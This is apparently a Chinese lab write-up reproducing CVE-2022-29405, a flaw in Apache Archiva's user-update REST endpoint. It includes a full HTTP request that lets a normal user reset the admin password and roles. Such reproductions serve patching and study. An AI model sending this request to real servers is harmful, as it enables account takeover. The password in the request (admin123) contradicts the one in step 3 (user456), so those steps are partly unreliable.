# CVE-2022-29405 Apache Archiva任意用户密码重置漏洞

Apache Archiva是一套可扩展的Artifact Repository管理系统。它能够与Maven，Continuum和ANT等构建工具完美结合。Archiva提供的功能包括：远程Repository代理，基于角色的安全访问管理，Artifact分发、维护、查询，生成使用报告，提供基于Web的管理界面等。

Apache Archiva 管理员创建的普通用户，其权限设置不当，导致普通用户可以修改任意用户信息。

影响版本

Apache Archiva 全版本（<=2.2.7）

项目地址https://github.com/apache/archiva/tree/master

参考链接：

- https://archiva.apache.org/docs/2.2.8/release-notes.html
- https://blog.csdn.net/shelter1234567/article/details/137235659

## 漏洞环境



执行如下命令启动一个apache-archiva-v2.2.7_web：

```
docker compose up -d
```

环境启动后，访问`http://your-ip:8080`

## 漏洞复现

1，创建管理员账号 admin:admin123

​     创建普通用户账号 user:user123 （勾选 validated）

![](https://img-blog.csdnimg.cn/direct/0da71b51ea394205bbfa738e401d9455.png)

![](https://img-blog.csdnimg.cn/direct/d364e3f8fc0948ab8302dd092a8d6a23.png)

2，用普通账号发送修改管理员账号的请求包

```
POST /restServices/redbackServices/userService/updateUser HTTP/1.1
Host: 10.66.64.106:8080
Content-Length: 752
Accept: application/json, text/javascript, */*; q=0.01
X-XSRF-TOKEN: [替换值]
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Content-Type: application/json
Origin: http://10.66.64.106:8080
Referer: http://10.66.64.106:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: [替换值]
Connection: close

{"username":"admin","password":"admin123","confirmPassword":"admin123","fullName":"the administrator","email":"admin@admin.com","permanent":true,"validated":true,"timestampAccountCreation":"Mon, 1 Apr 2024 05:36:44 +0000 - 5 minutes ago","timestampLastLogin":null,"timestampLastPasswordChange":"Mon, 1 Apr 2024 05:36:44 +0000 - 5 minutes ago","locked":false,"passwordChangeRequired":false,"assignedRoles":["Global Repository Manager","Global Repository Observer","Repository Manager - internal","Repository Manager - snapshots","Repository Observer - internal","Repository Observer - snapshots","System Administrator","User Administrator"],"modified":true,"readOnly":false,"userManagerId":"jdo","rememberme":false,"validationToken":null,"logged":false}
```

![](https://img-blog.csdnimg.cn/direct/f6489c08b6f34cf6970ed7cb5d6fb474.png)

3，用修改后的密码user456登录管理员账号admin 

![](https://img-blog.csdnimg.cn/direct/01ce590c5b35406eb66fdb1703621802.png)